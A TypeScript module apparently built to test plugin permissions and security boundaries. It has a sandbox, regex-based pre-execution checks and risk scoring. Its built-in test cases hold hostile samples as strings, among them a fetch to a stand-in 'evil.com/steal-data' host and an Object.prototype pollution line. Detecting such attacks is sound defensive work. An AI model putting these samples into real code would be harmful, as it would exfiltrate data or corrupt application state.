/**
 * Plugin Permission System and Security Boundary Tester
 * 
 * A comprehensive system for testing plugin permissions and security boundaries:
 * - Plugin permission validation and enforcement
 * - Security boundary testing between plugins and framework
 * - Resource access control and monitoring
 * - Permission escalation detection
 * - Cross-plugin communication security
 * - API surface protection and validation
 */

export interface PluginPermissions {
  // Core system access
  dom: {
    read: boolean
    write: boolean
    events: boolean
  }
  
  // Network and external resources
  network: {
    fetch: boolean
    websockets: boolean
    allowedDomains: string[]
  }
  
  // Storage access
  storage: {
    localStorage: boolean
    sessionStorage: boolean
    indexedDB: boolean
  }
  
  // Framework API access
  framework: {
    reactiveSystem: boolean
    componentRegistry: boolean
    assetSystem: boolean
    routing: boolean
  }
  
  // Cross-plugin communication
  communication: {
    sendMessages: boolean
    receiveMessages: boolean
    broadcastEvents: boolean
  }
  
  // System resources
  resources: {
    timers: boolean
    workers: boolean
    crypto: boolean
    geolocation: boolean
  }
  
  // Security settings
  security: {
    allowEval: boolean
    allowFunctionConstructor: boolean
    allowPrototypeModification: boolean
    sandbox: boolean
  }
}

export interface SecurityBoundary {
  id: string
  name: string
  type: 'api_surface' | 'resource_access' | 'cross_plugin' | 'framework_core'
  permissions: string[]
  enforcement: 'strict' | 'warn' | 'monitor'
  violations: SecurityViolation[]
}

export interface SecurityViolation {
  id: string
  timestamp: number
  boundaryId: string
  pluginId: string
  violationType: 'permission_denied' | 'escalation_attempt' | 'boundary_breach' | 'unauthorized_access'
  description: string
  severity: 'low' | 'medium' | 'high' | 'critical'
  evidence: {
    code?: string
    stackTrace?: string
    attemptedAction: string
    deniedPermission: string
  }
  blocked: boolean
  mitigation?: string
}

export interface PluginSecurityReport {
  pluginId: string
  permissions: PluginPermissions
  boundaries: SecurityBoundary[]
  violations: SecurityViolation[]
  riskScore: number
  recommendations: string[]
  status: 'secure' | 'warning' | 'critical'
}

export interface PermissionTestCase {
  id: string
  name: string
  description: string
  pluginCode: string
  requiredPermissions: Partial<PluginPermissions>
  expectedViolations: string[]
  shouldBlock: boolean
}

export class PluginPermissionTester {
  private permissions: Map<string, PluginPermissions> = new Map()
  private boundaries: Map<string, SecurityBoundary> = new Map()
  private violations: SecurityViolation[] = []
  private monitoringEnabled = true
  private strictMode = true

  constructor(private config: {
    strictMode?: boolean
    monitoringEnabled?: boolean
    defaultPermissions?: Partial<PluginPermissions>
  } = {}) {
    this.strictMode = config.strictMode ?? true
    this.monitoringEnabled = config.monitoringEnabled ?? true
    
    this.initializeDefaultBoundaries()
  }

  /**
   * Initialize default security boundaries
   */
  private initializeDefaultBoundaries(): void {
    // API Surface Protection
    this.boundaries.set('api-surface', {
      id: 'api-surface',
      name: 'Framework API Surface',
      type: 'api_surface',
      permissions: ['framework.reactiveSystem', 'framework.componentRegistry'],
      enforcement: 'strict',
      violations: []
    })

    // Resource Access Control
    this.boundaries.set('resource-access', {
      id: 'resource-access',
      name: 'System Resource Access',
      type: 'resource_access',
      permissions: ['resources.timers', 'resources.workers', 'network.fetch'],
      enforcement: 'strict',
      violations: []
    })

    // Cross-Plugin Communication
    this.boundaries.set('cross-plugin', {
      id: 'cross-plugin',
      name: 'Cross-Plugin Communication',
      type: 'cross_plugin',
      permissions: ['communication.sendMessages', 'communication.receiveMessages'],
      enforcement: 'warn',
      violations: []
    })

    // Framework Core Protection
    this.boundaries.set('framework-core', {
      id: 'framework-core',
      name: 'Framework Core Protection',
      type: 'framework_core',
      permissions: ['security.allowEval', 'security.allowPrototypeModification'],
      enforcement: 'strict',
      violations: []
    })
  }

  /**
   * Set permissions for a plugin
   */
  setPluginPermissions(pluginId: string, permissions: Partial<PluginPermissions>): void {
    const defaultPermissions: PluginPermissions = {
      dom: { read: false, write: false, events: false },
      network: { fetch: false, websockets: false, allowedDomains: [] },
      storage: { localStorage: false, sessionStorage: false, indexedDB: false },
      framework: { reactiveSystem: false, componentRegistry: false, assetSystem: false, routing: false },
      communication: { sendMessages: false, receiveMessages: false, broadcastEvents: false },
      resources: { timers: false, workers: false, crypto: false, geolocation: false },
      security: { allowEval: false, allowFunctionConstructor: false, allowPrototypeModification: false, sandbox: true }
    }

    const mergedPermissions = this.mergePermissions(defaultPermissions, permissions)
    this.permissions.set(pluginId, mergedPermissions)
  }

  /**
   * Merge permission objects recursively
   */
  private mergePermissions(defaults: PluginPermissions, overrides: Partial<PluginPermissions>): PluginPermissions {
    const result = JSON.parse(JSON.stringify(defaults))
    
    for (const [key, value] of Object.entries(overrides)) {
      if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
        result[key] = { ...result[key], ...value }
      } else {
        result[key] = value
      }
    }
    
    return result
  }

  /**
   * Test plugin execution with permission validation
   */
  async testPluginPermissions(
    pluginId: string, 
    pluginCode: string, 
    requiredPermissions: Partial<PluginPermissions>
  ): Promise<PluginSecurityReport> {
    // Set up plugin permissions
    this.setPluginPermissions(pluginId, requiredPermissions)
    
    const permissions = this.permissions.get(pluginId)!
    const startTime = Date.now()
    
    // Create sandbox environment with permission enforcement
    const sandbox = this.createSecureSandbox(pluginId, permissions)
    
    // Monitor permission usage during execution
    const violations: SecurityViolation[] = []
    
    try {
      // Pre-execution security checks
      const preCheckViolations = await this.performPreExecutionChecks(pluginId, pluginCode)
      violations.push(...preCheckViolations)
      
      // Execute plugin in sandbox
      if (preCheckViolations.filter(v => v.blocked).length === 0) {
        await this.executeInSandbox(sandbox, pluginCode, pluginId)
      }
      
      // Post-execution security validation
      const postCheckViolations = await this.performPostExecutionChecks(pluginId, sandbox)
      violations.push(...postCheckViolations)
      
    } catch (error) {
      // Handle execution errors as potential security violations
      if (error instanceof SecurityError) {
        violations.push(this.createViolation(
          pluginId,
          'permission_denied',
          'critical',
          error.message,
          true,
          { attemptedAction: error.action, deniedPermission: error.permission }
        ))
      }
    }
    
    // Calculate risk score and generate report
    const riskScore = this.calculateRiskScore(violations, permissions)
    const recommendations = this.generateSecurityRecommendations(violations, permissions)
    const status = this.determineSecurityStatus(riskScore, violations)
    
    return {
      pluginId,
      permissions,
      boundaries: Array.from(this.boundaries.values()),
      violations,
      riskScore,
      recommendations,
      status
    }
  }

  /**
   * Create secure sandbox environment
   */
  private createSecureSandbox(pluginId: string, permissions: PluginPermissions): any {
    const sandbox: any = {}
    
    // Conditionally provide DOM access
    if (permissions.dom.read || permissions.dom.write) {
      sandbox.document = this.createRestrictedDocument(permissions.dom)
      sandbox.window = this.createRestrictedWindow(permissions.dom)
    }
    
    // Conditionally provide network access
    if (permissions.network.fetch) {
      sandbox.fetch = this.createRestrictedFetch(pluginId, permissions.network.allowedDomains)
    }
    
    // Conditionally provide storage access
    if (permissions.storage.localStorage) {
      sandbox.localStorage = this.createRestrictedStorage(pluginId, 'localStorage')
    }
    
    if (permissions.storage.sessionStorage) {
      sandbox.sessionStorage = this.createRestrictedStorage(pluginId, 'sessionStorage')
    }
    
    // Framework API access
    if (permissions.framework.reactiveSystem) {
      sandbox.TachUI = this.createRestrictedFrameworkAPI(pluginId, permissions.framework)
    }
    
    // Resource access
    if (permissions.resources.timers) {
      sandbox.setTimeout = this.createRestrictedTimer(pluginId, 'setTimeout')
      sandbox.setInterval = this.createRestrictedTimer(pluginId, 'setInterval')
    }
    
    // Security restrictions
    if (!permissions.security.allowEval) {
      sandbox.eval = () => {
        throw new SecurityError('eval() is not permitted', 'eval', 'security.allowEval')
      }
    }
    
    if (!permissions.security.allowFunctionConstructor) {
      sandbox.Function = () => {
        throw new SecurityError('Function constructor is not permitted', 'Function', 'security.allowFunctionConstructor')
      }
    }
    
    return sandbox
  }

  /**
   * Create restricted document object
   */
  private createRestrictedDocument(domPermissions: PluginPermissions['dom']): any {
    const restrictedDocument = {
      createElement: domPermissions.write ? (tagName: string) => {
        // Log DOM creation for monitoring
        this.logResourceAccess('dom', 'createElement', { tagName })
        return document.createElement(tagName)
      } : undefined,
      
      getElementById: domPermissions.read ? (id: string) => {
        this.logResourceAccess('dom', 'getElementById', { id })
        return document.getElementById(id)
      } : undefined,
      
      addEventListener: domPermissions.events ? (event: string, handler: Function) => {
        this.logResourceAccess('dom', 'addEventListener', { event })
        return document.addEventListener(event, handler)
      } : undefined
    }
    
    return restrictedDocument
  }

  /**
   * Create restricted window object
   */
  private createRestrictedWindow(domPermissions: PluginPermissions['dom']): any {
    return {
      location: domPermissions.read ? window.location : undefined,
      navigator: domPermissions.read ? window.navigator : undefined,
      alert: domPermissions.write ? window.alert : undefined
    }
  }

  /**
   * Create restricted fetch function
   */
  private createRestrictedFetch(pluginId: string, allowedDomains: string[]): any {
    return async (url: string, options?: RequestInit) => {
      // Validate domain access
      try {
        const urlObj = new URL(url)
        const domain = urlObj.hostname
        
        if (allowedDomains.length > 0 && !allowedDomains.includes(domain)) {
          throw new SecurityError(
            `Network access to domain '${domain}' is not permitted`,
            'fetch',
            'network.allowedDomains'
          )
        }
        
        this.logResourceAccess('network', 'fetch', { url, domain })
        
        // In a real implementation, this would proxy through a controlled fetch
        return Promise.resolve(new Response('{"mocked": true}'))
      } catch (error) {
        if (error instanceof SecurityError) {
          throw error
        }
        throw new SecurityError('Invalid URL provided to fetch', 'fetch', 'network.fetch')
      }
    }
  }

  /**
   * Create restricted storage access
   */
  private createRestrictedStorage(pluginId: string, storageType: string): any {
    const prefix = `plugin_${pluginId}_`
    
    return {
      getItem: (key: string) => {
        this.logResourceAccess('storage', 'getItem', { key, storageType })
        return localStorage.getItem(prefix + key)
      },
      setItem: (key: string, value: string) => {
        this.logResourceAccess('storage', 'setItem', { key, storageType })
        return localStorage.setItem(prefix + key, value)
      },
      removeItem: (key: string) => {
        this.logResourceAccess('storage', 'removeItem', { key, storageType })
        return localStorage.removeItem(prefix + key)
      }
    }
  }

  /**
   * Create restricted framework API
   */
  private createRestrictedFrameworkAPI(pluginId: string, frameworkPermissions: PluginPermissions['framework']): any {
    const api: any = {}
    
    if (frameworkPermissions.reactiveSystem) {
      api.createSignal = (value: any) => {
        this.logResourceAccess('framework', 'createSignal', { pluginId })
        // Return mock signal for testing
        return { value, set: (newValue: any) => { value = newValue } }
      }
    }
    
    if (frameworkPermissions.componentRegistry) {
      api.registerComponent = (name: string, component: any) => {
        this.logResourceAccess('framework', 'registerComponent', { name, pluginId })
        // Mock registration
        return true
      }
    }
    
    return api
  }

  /**
   * Create restricted timer functions
   */
  private createRestrictedTimer(pluginId: string, timerType: string): any {
    return (callback: Function, delay: number) => {
      this.logResourceAccess('resources', timerType, { delay, pluginId })
      // Return mock timer ID
      return Math.random()
    }
  }

  /**
   * Log resource access for monitoring
   */
  private logResourceAccess(category: string, action: string, details: any): void {
    if (this.monitoringEnabled) {
      // In a real implementation, this would be logged to a monitoring system
      console.log(`[PluginPermissionTester] ${category}.${action}:`, details)
    }
  }

  /**
   * Perform pre-execution security checks
   */
  private async performPreExecutionChecks(pluginId: string, code: string): Promise<SecurityViolation[]> {
    const violations: SecurityViolation[] = []
    const permissions = this.permissions.get(pluginId)!
    
    // Check for eval usage when not permitted
    if (!permissions.security.allowEval && /eval\s*\(/.test(code)) {
      violations.push(this.createViolation(
        pluginId,
        'permission_denied',
        'critical',
        'Plugin attempts to use eval() without permission',
        true,
        { attemptedAction: 'eval', deniedPermission: 'security.allowEval', code }
      ))
    }
    
    // Check for Function constructor usage
    if (!permissions.security.allowFunctionConstructor && /new\s+Function\s*\(/.test(code)) {
      violations.push(this.createViolation(
        pluginId,
        'permission_denied',
        'critical',
        'Plugin attempts to use Function constructor without permission',
        true,
        { attemptedAction: 'Function', deniedPermission: 'security.allowFunctionConstructor', code }
      ))
    }
    
    // Check for prototype modification attempts - more comprehensive patterns
    if (!permissions.security.allowPrototypeModification) {
      const prototypePatterns = [
        /\.prototype\s*[=\[]/,
        /Object\.prototype/,
        /__proto__/,
        /Array\.prototype/,
        /Function\.prototype/
      ]
      
      for (const pattern of prototypePatterns) {
        if (pattern.test(code)) {
          violations.push(this.createViolation(
            pluginId,
            'permission_denied',
            'high',
            'Plugin attempts to modify prototypes without permission',
            true,
            { attemptedAction: 'prototype_modification', deniedPermission: 'security.allowPrototypeModification', code }
          ))
          break
        }
      }
    }
    
    // Check for DOM access without permission - more specific patterns
    if (!permissions.dom.write) {
      const domWritePatterns = [
        /document\.write/,
        /document\.createElement/,
        /\.innerHTML\s*=/,
        /document\.appendChild/,
        /document\.insertBefore/
      ]
      
      for (const pattern of domWritePatterns) {
        if (pattern.test(code)) {
          violations.push(this.createViolation(
            pluginId,
            'permission_denied',
            'medium',
            'Plugin attempts DOM modification without write permission',
            true,
            { attemptedAction: 'dom_write', deniedPermission: 'dom.write', code }
          ))
          break
        }
      }
    }
    
    // Check for network access without permission
    if (!permissions.network.fetch && /fetch\s*\(/.test(code)) {
      violations.push(this.createViolation(
        pluginId,
        'permission_denied',
        'medium',
        'Plugin attempts network access without permission',
        true,
        { attemptedAction: 'fetch', deniedPermission: 'network.fetch', code }
      ))
    }
    
    // Check for allowed domain violations for network access
    if (permissions.network.fetch && permissions.network.allowedDomains.length > 0) {
      const fetchMatches = code.match(/fetch\s*\(\s*['"`]([^'"`]+)['"`]/g)
      if (fetchMatches) {
        for (const match of fetchMatches) {
          const urlMatch = match.match(/['"`]([^'"`]+)['"`]/)
          if (urlMatch) {
            try {
              const url = new URL(urlMatch[1])
              if (!permissions.network.allowedDomains.includes(url.hostname)) {
                violations.push(this.createViolation(
                  pluginId,
                  'permission_denied',
                  'medium',
                  `Network access to domain '${url.hostname}' is not permitted`,
                  true,
                  { attemptedAction: 'fetch', deniedPermission: 'network.allowedDomains', code }
                ))
              }
            } catch (e) {
              // Ignore invalid URLs in static analysis
            }
          }
        }
      }
    }
    
    return violations
  }

  /**
   * Execute code in sandbox
   */
  private async executeInSandbox(sandbox: any, code: string, pluginId: string): Promise<void> {
    try {
      // Create isolated execution context
      const func = new Function(...Object.keys(sandbox), `"use strict"; ${code}`)
      func.apply(null, Object.values(sandbox))
    } catch (error) {
      if (error instanceof SecurityError) {
        throw error
      }
      // For testing purposes, we don't want to treat all execution errors as security issues
      // Only throw SecurityError for actual security violations detected by our sandbox
      if (error.message.includes('not permitted') || error.message.includes('SecurityError')) {
        throw new SecurityError(
          `Security violation during execution: ${error.message}`,
          'execution',
          'security'
        )
      }
      // Other execution errors (syntax errors, etc.) are not security issues
      // Just log them but don't fail the security test
      console.debug(`Plugin execution error (non-security): ${error.message}`)
    }
  }

  /**
   * Perform post-execution security checks
   */
  private async performPostExecutionChecks(pluginId: string, sandbox: any): Promise<SecurityViolation[]> {
    const violations: SecurityViolation[] = []
    
    // Check for unauthorized global modifications
    if (this.hasUnauthorizedGlobalModifications(sandbox)) {
      violations.push(this.createViolation(
        pluginId,
        'boundary_breach',
        'high',
        'Plugin modified global scope without permission',
        false,
        { attemptedAction: 'global_modification', deniedPermission: 'framework.core' }
      ))
    }
    
    // Check for memory usage violations
    const memoryUsage = this.estimateMemoryUsage(sandbox)
    if (memoryUsage > 10 * 1024 * 1024) { // 10MB limit
      violations.push(this.createViolation(
        pluginId,
        'unauthorized_access',
        'medium',
        'Plugin exceeded memory usage limits',
        false,
        { attemptedAction: 'memory_allocation', deniedPermission: 'resources.memory' }
      ))
    }
    
    return violations
  }

  /**
   * Check for unauthorized global modifications
   */
  private hasUnauthorizedGlobalModifications(sandbox: any): boolean {
    // In a real implementation, this would compare sandbox state before/after execution
    return false
  }

  /**
   * Estimate memory usage of sandbox
   */
  private estimateMemoryUsage(sandbox: any): number {
    // Simplified memory estimation
    const serialized = JSON.stringify(sandbox)
    return serialized.length * 2 // Rough estimate in bytes
  }

  /**
   * Create security violation record
   */
  private createViolation(
    pluginId: string,
    violationType: SecurityViolation['violationType'],
    severity: SecurityViolation['severity'],
    description: string,
    blocked: boolean,
    evidence: Partial<SecurityViolation['evidence']>
  ): SecurityViolation {
    const violation: SecurityViolation = {
      id: `violation_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      timestamp: Date.now(),
      boundaryId: this.findRelevantBoundary(evidence.deniedPermission || ''),
      pluginId,
      violationType,
      description,
      severity,
      evidence: {
        attemptedAction: evidence.attemptedAction || 'unknown',
        deniedPermission: evidence.deniedPermission || 'unknown',
        code: evidence.code,
        stackTrace: evidence.stackTrace
      },
      blocked,
      mitigation: this.generateMitigation(violationType, severity)
    }
    
    this.violations.push(violation)
    
    // Add to relevant boundary
    const boundary = this.boundaries.get(violation.boundaryId)
    if (boundary) {
      boundary.violations.push(violation)
    }
    
    return violation
  }

  /**
   * Find relevant security boundary for permission
   */
  private findRelevantBoundary(permission: string): string {
    if (permission.startsWith('security.')) return 'framework-core'
    if (permission.startsWith('framework.')) return 'api-surface'
    if (permission.startsWith('resources.') || permission.startsWith('network.')) return 'resource-access'
    if (permission.startsWith('communication.')) return 'cross-plugin'
    return 'api-surface' // default
  }

  /**
   * Generate mitigation strategy
   */
  private generateMitigation(violationType: SecurityViolation['violationType'], severity: SecurityViolation['severity']): string {
    const mitigations = {
      permission_denied: {
        critical: 'Block plugin execution and review permissions',
        high: 'Restrict plugin capabilities and monitor usage',
        medium: 'Log violation and consider permission adjustment',
        low: 'Monitor for repeated violations'
      },
      escalation_attempt: {
        critical: 'Immediately block plugin and audit code',
        high: 'Suspend plugin and require security review',
        medium: 'Increase monitoring and restrict permissions',
        low: 'Log attempt and monitor behavior'
      },
      boundary_breach: {
        critical: 'Isolate plugin and perform security audit',
        high: 'Restrict plugin access and enhance sandboxing',
        medium: 'Review plugin boundaries and permissions',
        low: 'Monitor for additional boundary issues'
      },
      unauthorized_access: {
        critical: 'Block access and audit plugin behavior',
        high: 'Restrict resource access and monitor usage',
        medium: 'Review resource permissions and limits',
        low: 'Log access attempt and monitor patterns'
      }
    }
    
    return mitigations[violationType][severity]
  }

  /**
   * Calculate risk score based on violations
   */
  private calculateRiskScore(violations: SecurityViolation[], permissions: PluginPermissions): number {
    let score = 0
    
    // Base score from permissions (more permissions = higher risk)
    score += this.calculatePermissionRisk(permissions)
    
    // Add violation penalties
    for (const violation of violations) {
      switch (violation.severity) {
        case 'critical': score += 25; break
        case 'high': score += 15; break
        case 'medium': score += 10; break
        case 'low': score += 5; break
      }
      
      if (violation.blocked) {
        score += 10 // Additional penalty for blocked violations
      }
    }
    
    return Math.min(100, score)
  }

  /**
   * Calculate risk from permissions
   */
  private calculatePermissionRisk(permissions: PluginPermissions): number {
    let risk = 0
    
    // High-risk permissions
    if (permissions.security.allowEval) risk += 15
    if (permissions.security.allowFunctionConstructor) risk += 10
    if (permissions.security.allowPrototypeModification) risk += 10
    if (permissions.network.fetch && permissions.network.allowedDomains.length === 0) risk += 8
    if (permissions.resources.workers) risk += 5
    
    // Medium-risk permissions
    if (permissions.network.fetch && permissions.network.allowedDomains.length > 0) risk += 3
    if (permissions.dom.write) risk += 2
    if (permissions.storage.localStorage) risk += 2
    if (permissions.framework.componentRegistry) risk += 2
    
    // Low-risk permissions
    if (permissions.dom.read) risk += 1
    if (permissions.resources.timers) risk += 1
    
    return Math.min(30, risk) // Cap at 30 points from permissions
  }

  /**
   * Generate security recommendations
   */
  private generateSecurityRecommendations(violations: SecurityViolation[], permissions: PluginPermissions): string[] {
    const recommendations: string[] = []
    
    // Recommendations based on violations
    const criticalViolations = violations.filter(v => v.severity === 'critical')
    if (criticalViolations.length > 0) {
      recommendations.push('Critical security violations detected - immediate review required')
      recommendations.push('Consider blocking plugin until security issues are resolved')
    }
    
    const blockedViolations = violations.filter(v => v.blocked)
    if (blockedViolations.length > 0) {
      recommendations.push('Plugin functionality is currently blocked due to security violations')
      recommendations.push('Review and adjust plugin permissions before re-enabling')
    }
    
    // Recommendations based on permissions
    if (permissions.security.allowEval) {
      recommendations.push('eval() permission granted - ensure plugin code is thoroughly audited')
    }
    
    if (permissions.security.allowPrototypeModification) {
      recommendations.push('Prototype modification allowed - monitor for pollution attacks')
    }
    
    if (permissions.network.fetch && permissions.network.allowedDomains.length === 0) {
      recommendations.push('Network access granted without domain restrictions - consider limiting allowed domains')
    }
    
    if (recommendations.length === 0) {
      recommendations.push('Plugin security appears acceptable - continue monitoring')
    }
    
    return recommendations
  }

  /**
   * Determine overall security status
   */
  private determineSecurityStatus(riskScore: number, violations: SecurityViolation[]): PluginSecurityReport['status'] {
    const criticalViolations = violations.filter(v => v.severity === 'critical' && v.blocked)
    const highViolations = violations.filter(v => v.severity === 'high' && v.blocked)
    
    if (criticalViolations.length > 0) {
      return 'critical'
    } else if (highViolations.length > 0 || riskScore >= 60) {
      return 'warning'
    } else if (riskScore >= 25 || violations.filter(v => v.severity === 'medium' && v.blocked).length > 0) {
      return 'warning'
    } else {
      return 'secure'
    }
  }

  /**
   * Get predefined permission test cases
   */
  static getPermissionTestCases(): PermissionTestCase[] {
    return [
      {
        id: 'dom-write-violation',
        name: 'DOM Write Without Permission',
        description: 'Test plugin attempting DOM modification without write permission',
        pluginCode: `document.getElementById('test').innerHTML = 'modified'`,
        requiredPermissions: { dom: { read: true, write: false, events: false } },
        expectedViolations: ['permission_denied'],
        shouldBlock: true
      },
      {
        id: 'eval-violation',
        name: 'Eval Usage Without Permission',
        description: 'Test plugin attempting eval usage without permission',
        pluginCode: `eval('console.log("executed")')`,
        requiredPermissions: { security: { allowEval: false, allowFunctionConstructor: false, allowPrototypeModification: false, sandbox: true } },
        expectedViolations: ['permission_denied'],
        shouldBlock: true
      },
      {
        id: 'network-domain-violation',
        name: 'Network Access to Restricted Domain',
        description: 'Test plugin attempting network access to non-allowed domain',
        pluginCode: `fetch('https://evil.com/steal-data')`,
        requiredPermissions: { network: { fetch: true, websockets: false, allowedDomains: ['trusted.com'] } },
        expectedViolations: ['permission_denied'],
        shouldBlock: true
      },
      {
        id: 'prototype-pollution',
        name: 'Prototype Pollution Attempt',
        description: 'Test plugin attempting prototype pollution without permission',
        pluginCode: `Object.prototype.isAdmin = true`,
        requiredPermissions: { security: { allowEval: false, allowFunctionConstructor: false, allowPrototypeModification: false, sandbox: true } },
        expectedViolations: ['permission_denied'],
        shouldBlock: true
      },
      {
        id: 'authorized-access',
        name: 'Authorized Resource Access',
        description: 'Test plugin with proper permissions accessing resources',
        pluginCode: `
          const element = document.createElement('div');
          fetch('https://api.example.com/data');
        `,
        requiredPermissions: {
          dom: { read: true, write: true, events: false },
          network: { fetch: true, websockets: false, allowedDomains: ['api.example.com'] }
        },
        expectedViolations: [],
        shouldBlock: false
      },
      {
        id: 'function-constructor-violation',
        name: 'Function Constructor Without Permission',
        description: 'Test plugin attempting Function constructor usage without permission',
        pluginCode: `new Function('return alert("constructed")')()`,
        requiredPermissions: { security: { allowEval: false, allowFunctionConstructor: false, allowPrototypeModification: false, sandbox: true } },
        expectedViolations: ['permission_denied'],
        shouldBlock: true
      }
    ]
  }

  /**
   * Run comprehensive permission test suite
   */
  async runPermissionTestSuite(): Promise<Map<string, PluginSecurityReport>> {
    const testCases = PluginPermissionTester.getPermissionTestCases()
    const results = new Map<string, PluginSecurityReport>()
    
    for (const testCase of testCases) {
      const report = await this.testPluginPermissions(
        testCase.id,
        testCase.pluginCode,
        testCase.requiredPermissions
      )
      
      results.set(testCase.id, report)
    }
    
    return results
  }

  /**
   * Get all security violations
   */
  getAllViolations(): SecurityViolation[] {
    return [...this.violations]
  }

  /**
   * Get violations by plugin
   */
  getViolationsByPlugin(pluginId: string): SecurityViolation[] {
    return this.violations.filter(v => v.pluginId === pluginId)
  }

  /**
   * Get violations by severity
   */
  getViolationsBySeverity(severity: SecurityViolation['severity']): SecurityViolation[] {
    return this.violations.filter(v => v.severity === severity)
  }

  /**
   * Clear all violations (for testing)
   */
  clearViolations(): void {
    this.violations = []
    for (const boundary of this.boundaries.values()) {
      boundary.violations = []
    }
  }
}

/**
 * Security error class for permission violations
 */
export class SecurityError extends Error {
  constructor(
    message: string,
    public action: string,
    public permission: string
  ) {
    super(message)
    this.name = 'SecurityError'
  }
}

/**
 * Create plugin permission tester with default configuration
 */
export function createPluginPermissionTester(config?: {
  strictMode?: boolean
  monitoringEnabled?: boolean
  defaultPermissions?: Partial<PluginPermissions>
}): PluginPermissionTester {
  return new PluginPermissionTester(config)
}